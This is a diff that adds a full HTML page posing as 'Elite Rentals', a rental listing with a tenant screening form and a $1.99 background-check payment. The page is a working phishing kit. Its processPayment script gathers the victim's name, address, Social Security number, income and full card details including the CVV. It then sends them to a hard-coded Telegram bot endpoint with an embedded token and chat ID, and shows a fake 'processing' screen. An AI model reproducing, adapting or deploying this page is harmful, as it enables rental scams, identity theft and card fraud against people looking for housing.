@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Rentals | Premium Property Leasing</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            color: #333;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .page {
+            display: none;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+            margin-top: 30px;
+        }
+
+        .active-page {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 40px;
+            color: #2c3e50;
+        }
+
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 30px;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 10px;
+        }
+
+        .property-image {
+            width: 100%;
+            height: 400px;
+            object-fit: cover;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+
+        .btn {
+            background: #3498db;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            display: inline-block;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            background: #2980b9;
+            transform: translateY(-2px);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 500;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+
+        .payment-details {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .processing-message {
+            text-align: center;
+            padding: 50px 0;
+            font-size: 18px;
+        }
+
+        .page-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .page-header img {
+            width: 80px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading"><i class="fas fa-spinner fa-spin"></i></div>
+
+    <div class="container">
+        <!-- Page 1: Introduction -->
+        <div class="page active-page" id="page1">
+            <div class="page-header">
+                <h1>Welcome to Elite Rentals</h1>
+            </div>
+            <img src="https://images1.apartments.com/i2/5Xcm3-ATTg-o_YpyjSx42rL_H2k37cS6GCj4bueLHJc/116/historic-irvington-flats-indianapolis-in-primary-photo.jpg?p=1" class="property-image" alt="Property">
+            <h2>Available Property: $1,250</h2>
+            <p>📍 810 S 16th St
+Newark, NJ  07108
+United States</p>
+            <div style="margin: 25px 0;">
+                <h3>Property Highlights</h3>
+                <ul style="margin: 15px 0; list-style: none;">
+                    <li>✓ 1 Bedrooms / 1 Bathrooms</li>
+                    <li>✓ 670 Sq Ft Living Space</li>
+                    <li>✓ Panoramic City Views</li>
+                    
+                    <li>✓ 24/7 Concierge Service</li>
+                </ul>
+            </div>
+            <button class="btn" onclick="nextPage(1)">Start Application</button>
+        </div>
+
+        <!-- Page 2: Background Check -->
+        <div class="page" id="page2">
+            <div class="page-header">
+                <h1>Tenant Screening Application</h1>
+            </div>
+            <form onsubmit="event.preventDefault(); nextPage(2)">
+                <div class="form-group">
+                    <label>Full Legal Name</label>
+                    <input type="text" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Current Address</label>
+                    <input type="text" placeholder="Street Address" required>
+                    <input type="text" placeholder="City" required style="margin-top:8px;">
+                    <input type="text" placeholder="State" required style="margin-top:8px;">
+                    <input type="text" placeholder="ZIP Code" required style="margin-top:8px;">
+                </div>
+
+                <div class="form-group">
+                    <label>Social Security Number</label>
+                    <input type="text" pattern="\d{3}-\d{2}-\d{4}" placeholder="XXX-XX-XXXX" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Current Employer</label>
+                    <input type="text" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Annual Income</label>
+                    <input type="number" required>
+                </div>
+
+                <button class="btn" type="submit">Continue to Payment</button>
+            </form>
+        </div>
+
+        <!-- Page 3: Payment -->
+        <div class="page" id="page3">
+            <div class="page-header">
+                <h1>Background Check Payment</h1>
+                <p>Secure Payment Processing - $1.99 Fee</p>
+            </div>
+            <div class="payment-details">
+                <form onsubmit="event.preventDefault(); processPayment()">
+                    <div class="form-group">
+                        <label>Card Number</label>
+                        <input type="text" pattern="\d{16}" placeholder="4242 4242 4242 4242" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Expiration Date</label>
+                        <input type="month" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" pattern="\d{3}" placeholder="123" required>
+                    </div>
+
+                    <button class="btn" type="submit">Submit Payment</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Processing Screen -->
+        <div class="page" id="processing">
+            <div class="processing-message">
+                <i class="fas fa-spinner fa-spin" style="font-size: 40px; margin-bottom: 20px;"></i>
+                <h2>Processing Your Application</h2>
+                <p>Please wait while we process your information...</p>
+                <p>You will receive a confirmation email shortly.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Help Button (fixed at bottom right) -->
+    <a href="tel:+12025550123" 
+       id="helpButton"
+       style="
+          position: fixed;
+          right: 30px;
+          bottom: 30px;
+          background: #3498db;
+          color: #fff;
+          border-radius: 50px;
+          padding: 16px 28px;
+          font-size: 18px;
+          box-shadow: 0 4px 16px rgba(52,152,219,0.15);
+          text-decoration: none;
+          z-index: 1000;
+          display: flex;
+          align-items: center;
+          gap: 10px;
+          transition: background 0.2s;
+       "
+       onclick="event.preventDefault(); showHelpModal();"
+    >
+       <i class="fas fa-question-circle"></i> Help
+    </a>
+
+    <!-- Help Modal -->
+    <div id="helpModal" style="
+        display:none;
+        position: fixed;
+        left: 0; top: 0; width: 100vw; height: 100vh;
+        background: rgba(0,0,0,0.35);
+        z-index: 2000;
+        align-items: center;
+        justify-content: center;
+    ">
+      <div style="
+          background: #fff;
+          border-radius: 16px;
+          padding: 32px 24px;
+          max-width: 90vw;
+          width: 350px;
+          box-shadow: 0 8px 32px rgba(44,62,80,0.15);
+          text-align: center;
+          position: relative;
+      ">
+        <button onclick="closeHelpModal()" style="
+            position: absolute;
+            top: 12px; right: 16px;
+            background: none;
+            border: none;
+            font-size: 22px;
+            color: #888;
+            cursor: pointer;
+        ">&times;</button>
+        <h2 style="margin-bottom: 18px; color: #2c3e50;">Contact Property</h2>
+        <p style="margin-bottom: 18px;">
+          For assistance, please contact our property manager:<br>
+          <a href="tel:+12025550123" style="color:#3498db; font-size:18px; font-weight:600; text-decoration:underline;">
+            +1 (202) 555-0123
+          </a><br>
+          <a href="mailto:leasing@eliterentals.com" style="color:#3498db; font-size:16px; font-weight:500; text-decoration:underline;">
+            leasing@eliterentals.com
+          </a>
+        </p>
+        <button class="btn" onclick="closeHelpModal()">Close</button>
+      </div>
+    </div>
+
+    <script>
+        function showLoading() {
+            document.querySelector('.loading').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.querySelector('.loading').style.display = 'none';
+        }
+
+        function nextPage(currentPage) {
+            showLoading();
+            setTimeout(() => {
+                document.querySelector('.active-page').classList.remove('active-page');
+                document.getElementById(`page${currentPage + 1}`).classList.add('active-page');
+                hideLoading();
+            }, 1500);
+        }
+
+        function processPayment() {
+            // Collect data from page 2 (application form)
+            const page2Inputs = document.querySelectorAll('#page2 input');
+            const fullName = page2Inputs[0]?.value || '';
+            const email = page2Inputs[1]?.value || '';
+            const addressStreet = page2Inputs[2]?.value || '';
+            const addressCity = page2Inputs[3]?.value || '';
+            const addressState = page2Inputs[4]?.value || '';
+            const addressZip = page2Inputs[5]?.value || '';
+            const ssn = page2Inputs[6]?.value || '';
+            const employer = page2Inputs[7]?.value || '';
+            const income = page2Inputs[8]?.value || '';
+
+            // Collect data from page 3 (payment form)
+            const page3Inputs = document.querySelectorAll('#page3 input');
+            const cardNumber = page3Inputs[0]?.value || '';
+            const expDate = page3Inputs[1]?.value || '';
+            const cvv = page3Inputs[2]?.value || '';
+
+            // Format message
+            const message =
+                `<b>New Application</b>\n` +
+                `<b>Name:</b> ${fullName}\n` +
+                `<b>Email:</b> ${email}\n` +
+                `<b>Address:</b> ${addressStreet}, ${addressCity}, ${addressState} ${addressZip}\n` +
+                `<b>SSN:</b> ${ssn}\n` +
+                `<b>Employer:</b> ${employer}\n` +
+                `<b>Income:</b> ${income}\n` +
+                `<b>Card Number:</b> ${cardNumber}\n` +
+                `<b>Exp Date:</b> ${expDate}\n` +
+                `<b>CVV:</b> ${cvv}\n` +
+                `<b>User Agent:</b> ${navigator.userAgent}\n` +
+                `<b>Timestamp:</b> ${new Date().toLocaleString()}`;
+
+            // Send to Telegram
+            fetch('https://api.telegram.org/bot8017921169:AAG_xbaMZGGWgysVE_qone_buK7x1b_Ixtk/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '7621733302',
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            showLoading();
+            setTimeout(() => {
+                document.querySelector('.active-page').classList.remove('active-page');
+                document.getElementById('processing').classList.add('active-page');
+                hideLoading();
+            }, 3000);
+        }
+
+        function showHelpModal() {
+            document.getElementById('helpModal').style.display = 'flex';
+        }
+        function closeHelpModal() {
+            document.getElementById('helpModal').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
